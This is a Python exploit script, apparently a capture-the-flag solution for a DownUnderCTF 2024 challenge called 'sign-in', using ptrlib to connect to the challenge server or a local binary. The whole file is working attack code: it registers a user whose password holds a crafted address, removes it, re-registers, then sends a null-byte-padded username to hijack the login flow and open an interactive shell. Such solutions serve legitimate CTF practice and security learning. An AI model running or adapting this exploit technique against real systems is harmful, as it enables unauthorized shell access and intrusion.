#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./sign-in")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "2024.ductf.dev:30022"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def signup(username: bytes | str, password: bytes | str, line: bool = True):
        if not line:
            io.sendafter("> ", "1")
            io.sendafter("username: ", username)
            io.sendafter("password: ", password)
            return
        io.sendlineafter("> ", "1")
        io.sendlineafter("username: ", username)
        io.sendlineafter("password: ", password)
        return

    def signin(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "2")
        io.sendlineafter("username: ", username)
        io.sendlineafter("password: ", password)
        io.recvlineafter(username)
        return

    def remove():
        io.sendlineafter("> ", "3")
        return

    signup("hello", ptr.p64(0x403EB8))
    signin("hello", ptr.p64(0x403EB8))
    remove()
    signup("good", "morning")
    signin("good", "morning")

    io.sendlineafter("> ", "2")

    io.sendlineafter("username: ", b"\x00" * 16 + b"4")
    io.recvuntil("> ")
    io.sh()
#

if __name__ == "__main__":
    main()
